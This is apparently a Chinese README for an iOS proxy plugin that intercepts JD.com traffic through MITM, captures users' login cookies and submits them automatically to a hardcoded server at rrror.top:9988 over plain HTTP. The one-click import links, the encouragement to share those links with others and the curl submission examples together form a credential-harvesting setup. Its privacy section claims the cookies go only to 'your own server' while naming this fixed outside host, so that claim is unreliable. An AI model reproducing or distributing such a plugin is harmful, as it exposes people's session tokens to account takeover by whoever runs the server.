# 京东Cookie自动提交

> 自动抓取京东Cookie并提交到后端API服务器

## 📱 支持平台

- ✅ Loon
- ✅ Quantumult X
- ✅ Surge
- ✅ Shadowrocket

## 🚀 快速开始

### Loon 用户（推荐）

1. 打开 Loon
2. 点击「配置」→「插件」→ 右上角「+」
3. 粘贴以下链接：

```
https://raw.githubusercontent.com/你的用户名/你的仓库/main/ios/jdck.plugin
```

4. 别名：京东Cookie自动提交
5. 点击「保存」
6. 打开京东App，进入「我的」页面
7. 完成！🎉

### Quantumult X 用户

1. 打开 Quantumult X
2. 点击右下角 ⚙️ → 重写 → 引用
3. 添加以下链接：

```
https://raw.githubusercontent.com/你的用户名/你的仓库/main/ios/jdck.snippet
```

4. 标签：京东Cookie自动提交
5. 点击「确定」
6. 打开京东App，进入「我的」页面
7. 完成！🎉

## 📋 使用说明

### 触发方式

打开京东App后，进行以下任一操作即可自动触发：

- 📱 访问「我的」页面
- ✅ 进行京东签到
- 👤 查看个人信息

### 成功标志

手机会收到通知：

```
🔔 京东Cookie
新增成功 / 更新成功
账号: jd_xxxxx
昵称: 你的京东昵称
青龙: ✅
```

### 查看日志

- **Loon**: 首页下拉 → Loon日志
- **Quantumult X**: 长按右下角风车 → 查看全部日志

## ⚙️ 配置说明

### API服务器

默认API地址：`http://rrror.top:9988/api/jd/submit_ck`

如需修改，请编辑 `jdck.js` 文件第8行：

```javascript
const API_URL = "http://你的域名:端口/api/jd/submit_ck";
```

### 抓包域名

- `api.m.jd.com`
- `me-api.jd.com`

## 🔧 故障排查

### 1️⃣ 没有触发脚本

- ✅ 检查插件是否已启用
- ✅ 确认MITM已开启
- ✅ 确认证书已安装并信任
- ✅ 查看日志是否有错误

### 2️⃣ 提示Cookie无效

- ✅ 退出京东App重新登录
- ✅ 清除京东App缓存
- ✅ 确保账号正常登录

### 3️⃣ API连接失败

- ✅ 检查服务器是否运行（访问 `http://rrror.top:9988/health`）
- ✅ 检查端口9988是否开放
- ✅ 检查网络连接

### 4️⃣ 重复提交

- 脚本会自动判断Cookie是否变化
- 相同Cookie不会重复提交
- 如需强制重新提交，清除脚本数据后重试

## 📊 功能特性

- ✅ **自动抓包** - 访问京东时自动捕获Cookie
- ✅ **自动提交** - 提交到你的API服务器
- ✅ **去重机制** - 避免重复提交相同Cookie
- ✅ **通知提醒** - 提交成功/失败即时通知
- ✅ **青龙同步** - 自动同步到青龙面板
- ✅ **多平台支持** - 兼容主流代理工具

## 🔒 隐私说明

- Cookie仅提交到你自己的服务器（`rrror.top:9988`）
- 不会发送到任何第三方服务器
- 所有数据存储在你的服务器数据库中

## 📞 技术支持

### 测试API是否正常

```bash
# 检查服务器健康状态
curl http://rrror.top:9988/health

# 应返回
{"code":200,"message":"healthy","service":"京东CK API"}
```

### 手动提交测试

```bash
curl -X POST http://rrror.top:9988/api/jd/submit_ck \
  -H "Content-Type: application/json" \
  -d '{"cookie":"pt_key=你的key;pt_pin=你的pin;"}'
```

## 📝 文件说明

| 文件 | 说明 |
|------|------|
| `jdck.js` | 核心脚本文件 |
| `jdck.plugin` | Loon插件配置 |
| `jdck.snippet` | Quantumult X重写配置 |
| `README.md` | 使用说明（本文件）|

## 🎯 部署到GitHub

### 1. 创建仓库

在GitHub上创建一个新仓库，例如：`jd-cookie-submit`

### 2. 上传文件

将 `ios` 文件夹中的所有文件上传到仓库

### 3. 获取链接

上传后，你的链接将是：

- **Loon**: `https://raw.githubusercontent.com/你的用户名/jd-cookie-submit/main/ios/jdck.plugin`
- **Quantumult X**: `https://raw.githubusercontent.com/你的用户名/jd-cookie-submit/main/ios/jdck.snippet`

### 4. 分享

将上述链接分享给需要的人，他们可以一键导入使用

## 🔄 更新日志

### v1.0.0 (2025-11-22)

- ✨ 首次发布
- ✅ 支持 Loon 和 Quantumult X
- 🚀 自动抓取并提交京东Cookie
- 🔔 支持通知提醒
- 💾 避免重复提交

## 📄 许可证

MIT License

---

**API服务器**: http://rrror.top:9988

**最后更新**: 2025-11-22
